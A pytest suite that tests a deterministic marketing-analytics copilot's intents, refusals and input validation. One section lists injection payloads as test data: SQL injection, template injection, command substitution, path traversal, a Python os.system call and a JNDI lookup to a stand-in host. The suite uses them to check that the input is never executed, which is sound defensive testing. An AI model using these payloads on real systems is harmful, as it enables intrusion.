"""
Phase 14 tests — Marketing Analyst Copilot.

Deterministic tests (the router itself is deterministic — no external
LLM is involved, so identical input always yields identical intent).
Same conventions as the Phase 10-13 suites. Run with:

    pytest backend/tests/test_copilot.py -v

Run from the repository root so relative paths resolve correctly.
"""

import pandas as pd
import pytest

from backend.app import create_app
from backend.services import copilot_service as cps
from backend.services.copilot_service import InvalidQuestion


@pytest.fixture()
def client():
    app = create_app("testing")
    app.config["TESTING"] = True
    app.config["SECRET_KEY"] = "phase14-test-key"
    with app.test_client() as c:
        yield c


@pytest.fixture()
def full_df():
    return pd.read_csv("data/cleaned/marketing_campaign_cleaned.csv")


def ask(client, question):
    return client.post("/api/copilot/ask", json={"question": question})


# ============================================================
# PAGE
# ============================================================


def test_copilot_page_loads(client):
    resp = client.get("/copilot")
    assert resp.status_code == 200
    body = resp.get_data(as_text=True)
    for needle in ["copilot-thread", "copilot-input", "copilot-ask-btn", "suggested-questions"]:
        assert needle in body


# ============================================================
# 1. OVERALL SUMMARY
# ============================================================


def test_overall_summary_intent(client):
    data = ask(client, "What is the average ROI?").get_json()
    assert data["intent"] == "OVERALL_SUMMARY"
    assert data["evidence_basis"] == "OBSERVED"
    assert "average roi" in data["answer"].lower()
    assert data["supporting_metrics"]["average_roi"] is not None


def test_overall_summary_matches_analytics_service(client, full_df):
    from backend.services import analytics_service

    expected = analytics_service.get_summary(full_df)
    data = ask(client, "Give me an overall summary").get_json()
    assert data["supporting_metrics"]["total_campaigns"] == expected["total_campaigns"]
    assert data["supporting_metrics"]["average_roi"] == expected["average_roi"]


# ============================================================
# 2-5. DIMENSION INTENTS
# ============================================================


def test_campaign_type_intent(client):
    data = ask(client, "Which campaign type has the highest average ROI?").get_json()
    assert data["intent"] == "CAMPAIGN_TYPE_ANALYSIS"
    assert data["evidence_basis"] == "OBSERVED"
    assert "highest observed" in data["answer"]


def test_customer_segment_intent(client):
    data = ask(client, "Which customer segment generates the highest revenue?").get_json()
    assert data["intent"] == "CUSTOMER_SEGMENT_ANALYSIS"
    assert "highest observed total revenue" in data["answer"]


def test_target_audience_intent(client):
    data = ask(client, "Which target audience has the highest average ROI?").get_json()
    assert data["intent"] == "TARGET_AUDIENCE_ANALYSIS"
    assert data["evidence_basis"] == "OBSERVED"


def test_channel_intent_does_not_split_multichannel(client):
    data = ask(client, "Which channel group has the highest observed ROI?").get_json()
    assert data["intent"] == "CHANNEL_ANALYSIS"
    assert any("not split into individual channel attribution" in c for c in data["caveats"])


# ============================================================
# 6. METRIC QUESTIONS
# ============================================================


@pytest.mark.parametrize(
    "question,metric_key",
    [
        ("What is the total revenue?", "total_revenue"),
        ("What is the average acquisition cost?", "average_acquisition_cost"),
        ("What is the total conversions?", "total_conversions"),
        ("What is the average engagement score?", "average_engagement_score"),
    ],
)
def test_metric_questions_return_real_values(client, question, metric_key):
    data = ask(client, question).get_json()
    assert data["status"] == "success"
    assert data["supporting_metrics"].get(metric_key) is not None


def test_metric_detection_is_deterministic():
    assert cps.detect_metric("what is the average roi") == "average_roi"
    assert cps.detect_metric("what is the median roi") == "median_roi"
    assert cps.detect_metric("total revenue please") == "total_revenue"
    assert cps.detect_metric("average acquisition cost") == "average_acquisition_cost"
    assert cps.detect_metric("no metric mentioned here") is None


# ============================================================
# 7-8. CAMPAIGN LOOKUP
# ============================================================


def test_campaign_lookup_finds_real_campaign(client, full_df):
    real_id = str(full_df["Campaign_ID"].iloc[0])
    data = ask(client, f"Show me campaign {real_id}").get_json()
    assert data["intent"] == "CAMPAIGN_LOOKUP"
    assert data["supporting_metrics"]["Campaign_ID"] == real_id
    assert data["evidence_basis"] == "OBSERVED"


def test_campaign_lookup_missing_campaign_is_not_invented(client):
    data = ask(client, "Show me campaign ZZ-CMP-9999999").get_json()
    assert data["answer"] == "Campaign ID not found in the connected dataset."
    assert data["supporting_metrics"] == {}


# ============================================================
# 9. A/B TEST
# ============================================================


def test_ab_test_intent_uses_experimental_evidence(client):
    data = ask(client, "What does the Social Media vs Paid Ads A/B test show?").get_json()
    assert data["intent"] == "AB_TEST"
    assert data["evidence_basis"] == "EXPERIMENTAL"
    assert "p_value" in data["supporting_metrics"]


def test_ab_test_answer_avoids_causal_claim(client):
    data = ask(client, "Is the A/B test result statistically significant?").get_json()
    combined = (data["answer"] + " " + " ".join(data["caveats"])).lower()
    assert "does not establish that one channel causes" in combined


# ============================================================
# 10. FORECAST
# ============================================================


def test_forecast_intent_uses_predictive_evidence(client):
    data = ask(client, "What is the current revenue outlook?").get_json()
    assert data["intent"] == "FORECAST"
    assert data["evidence_basis"] == "PREDICTIVE"
    assert "directional outlook suggests" in data["answer"].lower()
    assert data["supporting_metrics"]["trend_direction"] in ("UP", "DOWN", "STABLE")


def test_forecast_never_promises_certainty(client):
    data = ask(client, "What is the ROI trend direction?").get_json()
    answer = data["answer"].lower()
    assert "will increase" not in answer
    assert "will definitely" not in answer


# ============================================================
# 11. MODEL INTELLIGENCE
# ============================================================


def test_model_question_returns_real_metrics(client):
    data = ask(client, "What is the ROI model's R2?").get_json()
    assert data["intent"] == "MODEL_INTELLIGENCE"
    assert data["evidence_basis"] == "PREDICTIVE"
    assert 0 <= data["supporting_metrics"]["r2"] <= 1


def test_model_question_states_no_causality(client):
    data = ask(client, "What is the most important model feature?").get_json()
    assert "does not establish causality" in data["answer"]


def test_model_feature_name_is_humanized(client):
    data = ask(client, "What is the most important model feature?").get_json()
    assert "__" not in data["supporting_metrics"]["top_feature"]


# ============================================================
# 12. RECOMMENDATIONS
# ============================================================


def test_recommendations_intent(client):
    data = ask(client, "What are the main recommendations?").get_json()
    assert data["intent"] == "RECOMMENDATIONS"
    assert data["supporting_metrics"]["total_recommendations"] > 0
    assert len(data["supporting_metrics"]["top_recommendations"]) > 0


# ============================================================
# 13. DATA QUALITY
# ============================================================


def test_data_quality_intent(client):
    data = ask(client, "Is the dataset ready for analysis?").get_json()
    assert data["intent"] == "DATA_QUALITY"
    assert data["evidence_basis"] == "OBSERVED"
    assert data["supporting_metrics"]["analytics_readiness"] in ("READY", "READY WITH CAUTION", "NOT READY")


def test_data_quality_score_question(client):
    data = ask(client, "What is the data-quality score?").get_json()
    assert data["intent"] == "DATA_QUALITY"
    assert 0 <= data["supporting_metrics"]["quality_score"] <= 100


# ============================================================
# 14. BUDGET OPTIMIZATION
# ============================================================


def test_budget_question_uses_documented_defaults(client):
    data = ask(client, "How should 1 lakh be allocated across campaign types?").get_json()
    assert data["intent"] == "BUDGET_OPTIMIZATION"
    assert data["supporting_metrics"]["total_budget"] == 100_000
    constraints = data["supporting_metrics"]["constraints"]
    assert constraints["min_allocation_percentage"] == 5
    assert constraints["max_allocation_percentage"] == 40
    assert constraints["risk_mode"] == "Balanced"


def test_budget_answer_is_labelled_illustrative(client):
    data = ask(client, "How should ₹500000 be allocated across campaign types?").get_json()
    assert "illustrative historical-performance-based allocation" in data["answer"]
    assert data["supporting_metrics"]["total_budget"] == 500_000


def test_budget_allocations_sum_to_100(client):
    data = ask(client, "How should 1 lakh be allocated across campaign types?").get_json()
    total = sum(a["allocation_percentage"] for a in data["supporting_metrics"]["allocations"])
    assert abs(total - 100) < 0.011


# ============================================================
# 15-16. UNSUPPORTED QUESTIONS
# ============================================================


def test_causal_question_is_refused(client):
    data = ask(client, "Which campaign strategy caused ROI to increase?").get_json()
    assert data["intent"] == "UNSUPPORTED"
    assert data["answer"] == cps.CAUSAL_REFUSAL


def test_future_guarantee_question_is_refused(client):
    data = ask(client, "Which campaign will definitely make the most money next month?").get_json()
    assert data["intent"] == "UNSUPPORTED"
    assert data["answer"] == cps.GUARANTEE_REFUSAL


def test_exact_forecast_question_is_refused(client):
    data = ask(client, "Tell me tomorrow's exact revenue").get_json()
    assert data["intent"] == "UNSUPPORTED"
    assert data["answer"] == cps.EXACT_FORECAST_REFUSAL


def test_out_of_scope_question_declines_rather_than_inventing(client):
    data = ask(client, "What is the airspeed velocity of an unladen swallow?").get_json()
    assert data["intent"] == "UNSUPPORTED"
    assert data["answer"] == cps.INSUFFICIENT_DATA


# ============================================================
# 17. AMBIGUOUS QUESTION
# ============================================================


def test_ambiguous_question_asks_for_clarification(client):
    data = ask(client, "Which one is best?").get_json()
    assert data["intent"] == "CLARIFICATION_NEEDED"
    assert "average ROI, revenue, conversions, or acquisition cost" in data["answer"]


def test_ambiguous_question_does_not_guess_a_metric(client):
    data = ask(client, "Which one is best?").get_json()
    assert data["supporting_metrics"] == {}


# ============================================================
# 18. EMPTY / INVALID QUESTION
# ============================================================


@pytest.mark.parametrize("payload", [{}, {"question": ""}, {"question": "   "}, {"question": 123}, {"question": None}])
def test_invalid_question_returns_400(client, payload):
    resp = client.post("/api/copilot/ask", json=payload)
    assert resp.status_code == 400
    data = resp.get_json()
    assert data["error"] == "invalid_input"
    assert "Traceback" not in str(data)


def test_overlong_question_returns_400(client):
    resp = client.post("/api/copilot/ask", json={"question": "a" * 600})
    assert resp.status_code == 400


def test_service_raises_invalid_question_directly(full_df):
    with pytest.raises(InvalidQuestion):
        cps.ask(full_df, "")


# ============================================================
# 19-20. CAPABILITIES / RESET APIs
# ============================================================


def test_capabilities_api(client):
    resp = client.get("/api/copilot/capabilities")
    assert resp.status_code == 200
    data = resp.get_json()
    assert len(data["capabilities"]) > 0
    for cap in data["capabilities"]:
        assert cap["intent"] in cps.INTENTS
        assert len(cap["examples"]) > 0
    assert any("does not use an external AI service" in n for n in data["notes"])


def test_reset_api(client):
    assert client.post("/api/copilot/reset").status_code == 200


# ============================================================
# 21. API SUCCESS SHAPE
# ============================================================


def test_answer_shape_is_auditable(client):
    data = ask(client, "Which campaign type has the highest average ROI?").get_json()
    for key in ("status", "intent", "answer", "evidence_basis", "supporting_metrics", "source_area", "caveats"):
        assert key in data
    assert data["evidence_basis"] in ("OBSERVED", "PREDICTIVE", "EXPERIMENTAL")


def test_invalid_json_body_returns_400(client):
    resp = client.post("/api/copilot/ask", json=[1, 2, 3])
    assert resp.status_code == 400


# ============================================================
# 22. SESSION CONTEXT / FOLLOW-UPS
# ============================================================


def test_follow_up_uses_previous_dimension_context(client):
    first = ask(client, "Which campaign type has the highest ROI?").get_json()
    assert first["intent"] == "CAMPAIGN_TYPE_ANALYSIS"

    follow_up = ask(client, "What about revenue?").get_json()
    assert follow_up["intent"] == "CAMPAIGN_TYPE_ANALYSIS"
    assert "total revenue" in follow_up["answer"].lower()


def test_reset_clears_follow_up_context(client):
    ask(client, "Which campaign type has the highest ROI?")
    client.post("/api/copilot/reset")
    after = ask(client, "What about revenue?").get_json()
    assert after["intent"] == "OVERALL_SUMMARY"


# ============================================================
# 23. DATASET UNAVAILABLE
# ============================================================


def test_dataset_unavailable_returns_503_not_stack_trace():
    from backend.services import data_service

    data_service.reset_cache()
    try:
        app = create_app("testing")
        app.config["SECRET_KEY"] = "phase14-test-key"
        app.config["DATA_PATH"] = "/tmp/definitely_does_not_exist.csv"
        with app.test_client() as c:
            resp = c.post("/api/copilot/ask", json={"question": "What is the average ROI?"})
            assert resp.status_code == 503
            data = resp.get_json()
            assert data["error"] == "dataset_unavailable"
            assert "Traceback" not in str(data)
    finally:
        data_service.reset_cache()


# ============================================================
# 24. NO CODE EXECUTION FROM USER INPUT
# ============================================================


MALICIOUS_INPUTS = [
    '__import__("os").system("touch /tmp/copilot_pwned")',
    "eval('1+1')",
    "exec('x=1')",
    "DROP TABLE campaigns; --",
    "'; DELETE FROM campaigns WHERE '1'='1",
    "{{7*7}}",
    "${jndi:ldap://evil.example/a}",
    "df.to_csv('/tmp/copilot_leak.csv')",
    "$(whoami)",
    "../../etc/passwd",
]


@pytest.mark.parametrize("payload", MALICIOUS_INPUTS)
def test_malicious_input_is_never_executed(client, payload):
    """Each input must be handled as inert text: a normal JSON answer
    (almost always a refusal), never an execution, never a 500.
    """
    resp = ask(client, payload)
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["status"] == "success"
    assert "Traceback" not in str(data)


def test_malicious_input_leaves_no_filesystem_side_effects(client):
    import os

    for marker in ("/tmp/copilot_pwned", "/tmp/copilot_leak.csv"):
        if os.path.exists(marker):
            os.remove(marker)

    for payload in MALICIOUS_INPUTS:
        ask(client, payload)

    assert not os.path.exists("/tmp/copilot_pwned")
    assert not os.path.exists("/tmp/copilot_leak.csv")


def test_template_injection_is_not_evaluated(client):
    data = ask(client, "{{7*7}}").get_json()
    assert "49" not in data["answer"]


def test_copilot_does_not_mutate_dataset(full_df):
    before_shape = full_df.shape
    before_hash = pd.util.hash_pandas_object(full_df).sum()

    for question in [
        "What is the average ROI?",
        "Which campaign type has the highest average ROI?",
        "How many campaigns have negative ROI?",
        "Show me campaign NY-CMP-1000",
    ]:
        cps.ask(
            full_df, question,
            data_path="data/cleaned/marketing_campaign_cleaned.csv",
            model_path="models/roi_early_stage_model.joblib",
            metadata_path="reports/roi_model_metadata.json",
        )

    assert full_df.shape == before_shape
    assert pd.util.hash_pandas_object(full_df).sum() == before_hash


# ============================================================
# ANALYTICAL SAFETY WORDING
# ============================================================


def test_no_causal_wording_in_dimension_answers(client):
    for question in [
        "Which campaign type has the highest average ROI?",
        "Which customer segment has the highest revenue?",
        "Which target audience has the highest average ROI?",
    ]:
        data = ask(client, question).get_json()
        answer = data["answer"].lower()
        assert "causes" not in answer
        assert "because it" not in answer
        assert "highest observed" in answer
        assert any("not causation" in c.lower() for c in data["caveats"])


# ============================================================
# REGRESSION — existing pages/APIs must still work
# ============================================================


@pytest.mark.parametrize(
    "path",
    [
        "/", "/campaign-analytics", "/marketing-intelligence", "/forecasting", "/statistics",
        "/ab-testing", "/roi-prediction", "/scenario-simulator", "/model-intelligence",
        "/business-insights", "/recommendations", "/executive-center", "/data-quality",
        "/budget-optimizer",
    ],
)
def test_existing_pages_still_load(client, path):
    assert client.get(path).status_code == 200


@pytest.mark.parametrize(
    "path",
    [
        "/api/summary", "/api/campaign-types", "/api/customer-segments", "/api/statistics",
        "/api/ab-test", "/api/model-info", "/api/model-comparison", "/api/model-intelligence",
        "/api/campaign-analytics/summary", "/api/recommendations", "/api/executive-summary",
        "/api/marketing-intelligence", "/api/forecasting", "/api/data-quality",
        "/api/budget-optimizer",
    ],
)
def test_existing_apis_still_work(client, path):
    assert client.get(path).status_code == 200


def test_scenario_compare_label_unchanged(client):
    payload = {
        "scenarios": [
            {
                "name": "A", "campaign_type": "Social Media", "target_audience": "Youth",
                "duration": 20, "channel": "Instagram", "language": "English",
                "customer_segment": "Youth", "acquisition_cost": 500,
            }
        ]
    }
    resp = client.post("/api/scenario/compare", json=payload)
    assert resp.status_code == 200
    assert "illustrative_estimated_profit" in resp.get_json()["scenarios"][0]
